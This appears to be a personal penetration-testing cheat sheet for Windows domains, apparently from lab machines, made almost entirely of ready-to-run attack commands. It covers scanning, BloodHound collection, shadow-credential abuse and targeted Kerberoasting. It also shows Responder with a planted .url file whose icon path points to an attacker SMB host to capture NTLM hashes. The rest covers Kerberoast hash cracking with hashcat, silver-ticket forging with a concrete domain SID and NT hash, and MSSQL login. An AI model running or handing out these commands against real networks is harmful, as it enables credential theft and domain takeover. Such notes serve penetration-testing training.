
# General
```bash
nmap -p- -A -o <hostname>.nmap <ip> -vvv
```
# Active Directory
## Basic Enumeration
```bash
enum4linux-ng <ip>
```
## BloodHound
Collect da Files
```bash
nxc ldap <domain> -u <username> -p <password> --bloodhound --collection All --dns-server <ip>
```
Start Bloodhound (as root)
```bash
bloodhound-start
```
### GenericWrite
This will pull a users NT hash | Only if PKINIT
```bash
certipy-ad shadow auto -username <username>@<domain> -p <password> -account <targetAccount>
```
Other attempt | Targeted Kerberoasting
Get da tool
```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast
```
Use da tool
```bash
python targetedKeberoast.py -u <ownedUser> -d <domain> -p <password> --request-user <targetUser>
```
# SMB
Anonymous IS DIFFERENT than Null
```
smbclient -L //<ip> -N
smbmap -H <ip> -u 'anonymous' -p ''
```
### SMB share -> NTLM Challenge 
Test for NTLM Challenge (if we think user is accessing share)
```bash
sudo responder -I tun0
```
Upload a .url file (e.g hawked.url)
```
[InternetShortcut]
URL=http://localhost
IconFile=\\10.10.14.71\hawked
IconIndex=1
```
# Keberos
## Kerberoasting
Search for acconts
```bash
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <ip> -request -outputfile kerberFIRE.txt
```
Crack Accounts
```bash
hashcat -a 0 -m 13100 kerberFIRE.txt /usr/share/wordlists/rockyou.txt
```
POTENTIAL SILVER TICKET ATTACK IF YOU CAN CRACK LSA FOR ACCOUNT THAT OWNS A SERVICE OR SOMETHING
**SEE OTHER SECTION FOR TARGETED KERBEROAST**
## Silver Ticket
Needed: viable service/svc_account, domain SID
### Get Domain SID

```bash
impacket-lookupsid '<domain>/<user>:<pass>'@<ip>
```
### Get NT Hash
```bash
python3 -c 'import hashlib; print(hashlib.new("md4", "PASSWORD".encode("utf-16le")).hexdigest())'
```
### Make ticket
```bash
impacket-ticketer -domain-sid 'S-1-5-21-2330692793-3312915120-706255856' -domain BREACH.vl -spn 'MSSQLSvc/breachdc.breach.vl:1433' -nthash '69596c7aa1e8daee17f8e78870e25a5c' Administrator
```
# MSSQL
Login with the following command
```bash
impacket-mssqlclient '<domain>/<user>:<passowrd>@<machine>' -windows-auth
```
Login but *Kerberos* style cause we freakay wid it
```bash
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass -windows-auth <fqdn>